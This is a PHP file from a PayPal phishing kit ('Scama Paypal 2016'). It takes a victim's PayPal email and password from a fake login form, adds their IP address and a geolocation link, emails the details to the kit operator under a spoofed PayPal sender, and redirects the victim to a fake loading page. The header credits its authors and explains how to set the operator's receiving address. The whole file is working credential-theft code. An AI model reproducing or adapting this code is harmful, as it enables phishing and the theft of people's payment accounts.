<?php
//////////////////////////////////////////////////////////////////////////////
//                                                                          //
//         Assalamu Aleikom : Scama Paypal 2016                             //
//                                                                          //
//   Coded By Nabil Tn & Devlopped By Noureddine ElmGhreBi                  //
//                                                                          //
// For Email OPen config.php And change islam@state.yes To your account     //
//                                                                          //
//  Youtube : https://www.youtube.com/channel/UCF_7-Bq6wfs-f4R0avbLUQg/      //
//                                                                          //
// Facebook : https://www.facebook.com/Nour.Blog1                           //
//                                                                          //
//  WebSite : http://nourblog1.blogspot.com/                                //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////
include ('config.php');

$ip = getenv("REMOTE_ADDR");                                  ##
$hostname = gethostbyaddr($ip);                               ##
$nab .= "=============[ Login PayPal Infos ]=========\n";     ##
$nab .= "Email  : ".$_POST['nabil1']."\n";                    ## 
$nab .= "Paswd  : ".$_POST['nabil2']."\n";                    ##
$nab .= "====================[IP]================\n";         ##  
$nab .= "IP	: http://www.geoiptool.com/?IP=$ip\n";            #
$nab .= "=========[ More Tools : http://nourblog1.blogspot.com/]=========\n";##
$subject = "-| Login info  | {$ip} |-";
$headers = "From:Result ^^ <paypal@supprot.com>";

mail($to, $subject, $nab,$headers);


header("Location:websc_loading.php?cmd=_flow&SESSION=update_zslEa-pH3fLzMHurkmQkjR59m8RQPT7uSS_4LsFtrCI149xUdAdboe9F46S&dispatch=5885d80a13c0db1f8e263663d3faee8d5c97cbf3d75cb63effe5661cdf3adb6d");


?>